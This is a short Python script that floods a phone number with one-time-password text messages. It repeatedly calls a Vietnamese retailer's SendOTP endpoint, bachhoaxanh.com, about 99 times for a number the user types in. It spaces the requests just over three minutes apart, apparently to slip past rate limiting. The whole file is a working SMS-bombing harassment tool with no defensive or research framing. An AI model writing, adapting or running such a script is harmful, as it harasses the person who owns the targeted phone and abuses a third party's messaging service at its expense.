# pip install requests

import requests
import json
import time

s = requests.Session()
u = 'https://www.bachhoaxanh.com/aj/Customer/SendOTP'
i = 1
l = 100 # 100 lần

print('Enter phone..')
p = input()

if not p:
    print('Phone is empty')
    exit()
if len(p) < 10:
    print('Is not phone')
    exit()

while (i < l) :
    payload = { 'phone': p, 'objectId': 'df99b1e8-11f1-4eca-b254-beff72deefbe', 'type': 4 }  

    respone = s.post(u, data=payload, allow_redirects=False)

    jsons = json.loads(respone.text)

    print('Lần: ',i,jsons['Msg'])

    i = i + 1

    time.sleep(181) # 3p + 1s delay



